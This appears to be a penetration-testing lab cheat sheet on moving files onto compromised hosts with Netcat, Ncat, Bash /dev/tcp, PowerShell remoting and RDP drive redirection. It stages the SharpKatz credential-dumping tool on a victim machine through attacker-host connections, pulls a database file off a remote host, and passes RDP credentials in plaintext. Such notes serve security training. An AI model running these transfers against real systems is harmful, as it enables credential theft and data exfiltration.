# File transfer methods — commands (Netcat / Ncat / RDP / PowerShell)

## Netcat (original) / Ncat

### Basic listener (compromised machine receives file)

```
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc -l -p 8000 > SharpKatz.exe
```

```
victim@target:~$ # Example using Ncat
victim@target:~$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

### Sending file from attack host to compromised machine

```
s0nam@htb[/htb]$ wget -q https://github.com/Flangvik/SharpCollection/raw/master/NetFramework_4.7_x64/SharpKatz.exe
s0nam@htb[/htb]$ # Example using Original Netcat
s0nam@htb[/htb]$ nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

```
s0nam@htb[/htb]$ # Example using Ncat
s0nam@htb[/htb]$ ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

### Reverse / listen on attacker (victim connects to attacker)

```
# Attacker listens and sends file as input to Netcat
s0nam@htb[/htb]$ # Example using Original Netcat
s0nam@htb[/htb]$ sudo nc -l -p 443 -q 0 < SharpKatz.exe

# Victim connects to receive the file
victim@target:~$ # Example using Original Netcat
victim@target:~$ nc 192.168.49.128 443 > SharpKatz.exe
```

```
# Attacker using Ncat
s0nam@htb[/htb]$ # Example using Ncat
s0nam@htb[/htb]$ sudo ncat -l -p 443 --send-only < SharpKatz.exe

# Victim using Ncat to receive
victim@target:~$ # Example using Ncat
victim@target:~$ ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

### When nc/ncat not available — Bash TCP pseudo-device

```
victim@target:~$ cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

> **Notes:**
> 
> - `--send-only` / `--recv-only` (ncat) and `-q 0` (nc) help the connection terminate cleanly after EOF.
>     
> - Use `sha256sum SharpKatz.exe` on both sides to verify integrity after transfer.
>     

---

## PowerShell Remoting (WinRM)

```
PS C:\htb> whoami
PS C:\htb> hostname
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

# Create a session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01

# Copy a local file to the remote session (push)
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\

# Copy a file from remote session to local (pull)
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

> **Notes:** WinRM listeners: HTTP 5985, HTTPS 5986. Requires PowerShell Remoting enabled and appropriate privileges.

---

## RDP (drive redirection & clipboard)

### rdesktop (mount local folder as redirected drive)

```
s0nam@htb[/htb]$ rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### xfreerdp (mount local folder as redirected drive)

```
s0nam@htb[/htb]$ xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

- On the Windows RDP session the redirected folder appears under `\\tsclient\linux` or as a drive under "This PC".
    
- Clipboard copy/paste can also transfer files if allowed.
    

> **Security reminder:** Avoid passing passwords on the command line (visible via `ps` and shell history). Omit `-p` to be prompted interactively.

---

## Quick checklist / best practices (commands to run)

```
# Check reachability (Linux)
nc -vz <target-ip> <port>

# Check reachability (Windows PowerShell)
Test-NetConnection -ComputerName <host> -Port 5985

# Verify transferred file integrity
sha256sum SharpKatz.exe
# or on Windows PowerShell
Get-FileHash -Path C:\path\to\SharpKatz.exe -Algorithm SHA256
```

---
